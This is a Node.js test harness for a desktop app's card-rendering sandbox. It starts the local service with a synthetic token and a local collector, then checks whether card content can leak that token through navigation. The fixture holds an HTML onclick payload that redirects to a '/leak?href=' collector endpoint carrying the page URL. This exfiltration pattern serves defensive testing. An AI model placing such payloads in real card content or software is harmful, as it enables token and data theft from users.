// 只访问本机合成服务与本机收集器，报告不保存整机凭证。
import { spawn } from 'node:child_process';
import fs from 'node:fs/promises';
import path from 'node:path';
import http from 'node:http';
import crypto from 'node:crypto';
const repo=process.cwd(); const bin=process.env.LINGXI_R07_SERVICE_BIN;
if(!bin) throw Error('必须指定独立服务二进制');
const evidence=path.resolve(process.env.LINGXI_R07_CARD_EVIDENCE||'artifacts/rust-tauri/R07/T08/card-navigation-baseline');
await fs.mkdir(evidence,{recursive:true}); const scratch=await fs.mkdtemp('/private/tmp/lingxi-card-nav-'); const home=path.join(scratch,'home');const workspace=path.join(scratch,'workspace');await fs.mkdir(home);await fs.mkdir(workspace);
await fs.writeFile(path.join(scratch,'config.json'),JSON.stringify({home,workspace}));
const env={...process.env};delete env.LINGXI_HOME;let stdout='',stderr='',token='';let observed=[];let child;let serviceExit;
const collector=http.createServer((req,res)=>{if(req.url.startsWith('/leak?')) { const href=new URL(req.url,'http://localhost').searchParams.get('href')||'';observed.push({tokenReadableAndSent:!!token&&href.includes(token),hrefSha256:crypto.createHash('sha256').update(href).digest('hex'),path:new URL(href).pathname});res.end('owned collector');}else{res.setHeader('Content-Type','application/json');res.end(JSON.stringify({count:observed.length,observed}));}});
await new Promise(r=>collector.listen(0,'127.0.0.1',r));const collectorUrl=`http://127.0.0.1:${collector.address().port}`;
const started=new Date().toISOString();let exitCode=null;
try{
 child=spawn(bin,['--config',path.join(scratch,'config.json'),'--bind','127.0.0.1:0','--shutdown-timeout-ms','5000'],{env,stdio:['ignore','pipe','pipe']});serviceExit=new Promise(resolve=>child.once('exit',(code,signal)=>resolve({code,signal})));child.stderr.on('data',b=>stderr+=b);
 const addr=await new Promise((resolve,reject)=>{const timer=setTimeout(()=>reject(Error('服务未就绪')),30000);child.stdout.on('data',b=>{stdout+=b;const m=stdout.match(/LINGXI_SERVICE_READY addr=(\S+)/);if(m){clearTimeout(timer);resolve(m[1]);}});child.once('exit',c=>{clearTimeout(timer);reject(Error('服务退出'+c+stderr));});});
 token=JSON.parse(await fs.readFile(path.join(home,'lingxi-service/local-token.json'),'utf8')).token;
 const code=`<button id="actual-card" onclick='this.textContent="done";location.href=${JSON.stringify(collectorUrl+'/leak?href=')}+encodeURIComponent(location.href)'>实际点击</button>`;
 const fixture={cardId:'navigation-probe',code,title:'本机导航检查'};
 const result=await new Promise((resolve,reject)=>{const ui=spawn(process.execPath,['desktop/src/react/__tests__/components/r07-t08-card-electron-launch.mjs'],{cwd:repo,env:{...env,LINGXI_R07_CARD_HOME:home,LINGXI_R07_CARD_URL:`http://${addr}`,LINGXI_R07_CARD_TOKEN:token,LINGXI_R07_CARD_BLOCK:JSON.stringify(fixture),LINGXI_R07_CARD_COLLECTOR:collectorUrl},stdio:['ignore','pipe','pipe']});let out='',err='';ui.stdout.on('data',b=>out+=b);ui.stderr.on('data',b=>err+=b);ui.once('error',reject);ui.once('exit',code=>resolve({code,out,err}));});
 exitCode=result.code;const redact=s=>s.replaceAll(token,'[REDACTED_SYNTHETIC_OWNER_TOKEN]');await fs.writeFile(path.join(evidence,'ui.log'),redact(result.out+'\n'+result.err));
 const native=await fs.readFile(path.join(home,'card-native-result.json'),'utf8').then(JSON.parse).catch(()=>({outcome:{count:observed.length,observed},error:'native_report_missing'}));await fs.writeFile(path.join(evidence,'native-result.json'),JSON.stringify(native,null,2));
 await fs.writeFile(path.join(evidence,'receipt.json'),JSON.stringify({started,finished:new Date().toISOString(),scratch,binary:bin,binarySha256:crypto.createHash('sha256').update(await fs.readFile(bin)).digest('hex'),exitCode,outcome:native.outcome,sourceOverride:process.env.LINGXI_R07_CARD_BASELINE_SOURCE||null,diagnosticSources:await Promise.all(['desktop/src/react/__tests__/components/r07-t08-card-navigation-probe.mjs','desktop/src/react/__tests__/components/r07-t08-card-electron-launch.mjs','desktop/src/react/__tests__/components/r07-t08-card-electron-main.cjs','desktop/src/react/__tests__/components/r07-t08-card-electron-preload.cjs','desktop/src/react/__tests__/components/r07-t08-card-fixture.tsx','desktop/src/shared/card-frame-navigation.cjs'].map(async p=>({path:p,sha256:crypto.createHash('sha256').update(await fs.readFile(p)).digest('hex')}))),sources:await Promise.all(['rust/crates/lingxi-service/src/cards.rs','desktop/src/react/components/chat/InteractiveCard.tsx'].map(async p=>({path:p,sha256:crypto.createHash('sha256').update(await fs.readFile(p)).digest('hex')})))},null,2));
 console.log(JSON.stringify({exitCode,outcome:native.outcome,evidence}));
}finally{
 child?.kill('SIGTERM');let timer;const shutdown=serviceExit?await Promise.race([serviceExit,new Promise(resolve=>{timer=setTimeout(()=>resolve({timeout:true}),10000);})]):{notStarted:true};clearTimeout(timer);
 if(shutdown.timeout){child.kill('SIGKILL');await serviceExit;process.exitCode=1;}
 await new Promise(r=>collector.close(r));await fs.writeFile(path.join(evidence,'cleanup.json'),JSON.stringify({service:shutdown,collectorClosed:!collector.listening},null,2));
 await fs.writeFile(path.join(evidence,'service.log'),token?stdout.replaceAll(token,'[REDACTED]')+'\n'+stderr.replaceAll(token,'[REDACTED]'):stdout+'\n'+stderr);
}
process.exitCode=process.exitCode||(exitCode??1);
